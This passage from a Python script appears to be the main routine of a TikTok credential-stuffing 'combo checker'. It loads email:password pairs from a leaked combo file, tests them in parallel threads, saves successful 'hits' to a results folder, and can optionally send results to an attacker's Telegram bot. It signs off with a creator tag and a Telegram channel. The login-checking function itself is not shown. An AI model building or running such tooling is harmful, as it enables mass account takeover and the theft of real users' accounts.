    bot_token = input(f"{Fore.CYAN}Bot Token (or press Enter to skip): {Fore.WHITE}").strip()
    if bot_token:
        TELEGRAM_BOT_TOKEN = bot_token
        chat_id = input(f"{Fore.CYAN}Chat ID: {Fore.WHITE}").strip()
        TELEGRAM_CHAT_ID = chat_id
        print(f"{Fore.GREEN}✅ Telegram Bot Enabled!{Fore.WHITE}\n")
    else:
        print(f"{Fore.YELLOW}⚠️  Telegram Bot Disabled{Fore.WHITE}\n")
    
    # Combo file
    print(f"{Fore.WHITE}┌{'─' * 58}┐")
    print(f"{Fore.WHITE}│ {Fore.CYAN}📂 COMBO FILE{' ' * 43}{Fore.WHITE} │")
    print(f"{Fore.WHITE}└{'─' * 58}┘\n")
    
    combo_file = input(f"{Fore.CYAN}Combo File (email:pass): {Fore.WHITE}").strip()
    
    if not os.path.exists(combo_file):
        print(f"{Fore.RED}❌ File not found!{Fore.WHITE}")
        return
    
    # Load combos
    combos = []
    with open(combo_file, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            line = line.strip()
            if ':' in line:
                parts = line.split(':', 1)
                if len(parts) == 2:
                    combos.append((parts[0].strip(), parts[1].strip()))
    
    total = len(combos)
    
    if total == 0:
        print(f"{Fore.RED}❌ No valid combos found!{Fore.WHITE}")
        return
    
    # Threads
    threads_input = input(f"{Fore.CYAN}Threads (default 5): {Fore.WHITE}").strip()
    threads = int(threads_input) if threads_input.isdigit() else 5
    threads = max(1, min(100, threads))
    
    print(f"\n{Fore.GREEN}✅ Loaded {total} combos")
    print(f"{Fore.GREEN}✅ Threads: {threads}")
    print(f"\n{Fore.YELLOW}Press Enter to start checking...{Fore.WHITE}")
    input()
    
    # Start checking
    update_display()
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(check_combo, email, password) for email, password in combos]
        
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                pass
    
    # Final summary
    print_summary()
    
    print(f"{Fore.CYAN}Results saved to: Results/TikTok_Hits/")
    print(f"{Fore.MAGENTA}Created by: {MY_SIGNATURE}")
    print(f"{Fore.MAGENTA}Channel: {TELEGRAM_CHANNEL}\n")

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}❌ Stopped by user{Fore.WHITE}")
    except Exception as e:
        print(f"\n{Fore.RED}❌ Error: {e}{Fore.WHITE}")
